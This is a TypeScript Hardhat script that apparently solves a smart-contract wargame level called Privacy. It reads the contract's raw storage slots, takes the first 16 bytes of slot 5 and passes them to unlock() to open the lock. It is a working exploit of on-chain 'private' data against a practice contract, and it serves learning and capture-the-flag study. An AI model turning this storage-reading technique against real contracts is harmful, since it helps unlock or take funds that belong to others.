import { ethers, network } from "hardhat";
import { Privacy } from "../typechain-types";

async function main() {
  let privacy: Privacy;

  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  //const [attacker] = await ethers.getSigners();

  if (isLocalTest) {
    privacy = await ethers.getContract("Privacy");
  } else {
    privacy = await ethers.getContractAt(
      "Privacy",
      "0x0D28eb8E5A42a98d1B1C87bfe04bDcE3f4980b08"
    );
  }

  const locked = await privacy.locked();

  console.log(`Locked: ${locked}`);

  //console.log("bytes32: ", ethers.utils.formatBytes32String("password1234"));
  // https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-12-reading-the-storage/topic/the-storage-layout/

  async function getStorageAt(index: number) {
    const storageAt = await ethers.provider.getStorageAt(
      privacy.address,
      index
    );
    console.log(`storage at ${index}: ${storageAt}`);
    return storageAt;
  }

  for (let i = 0; i < 7; i++) {
    await getStorageAt(i);
  }

  //const decoded = ethers.utils.parseBytes32String(storage1);
  //console.log(decoded);

  console.log("-----------------------------------------------------");

  const sliced = ethers.utils.hexDataSlice(
    await await ethers.provider.getStorageAt(privacy.address, 5),
    0,
    16
  );

  console.log(sliced);

  const tx = await privacy.unlock(sliced, {
    gasLimit: "8000000",
  });

  await tx.wait(isLocalTest ? 1 : 5);

  const lockedFinal = await privacy.locked();

  console.log(`Locked: ${lockedFinal}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
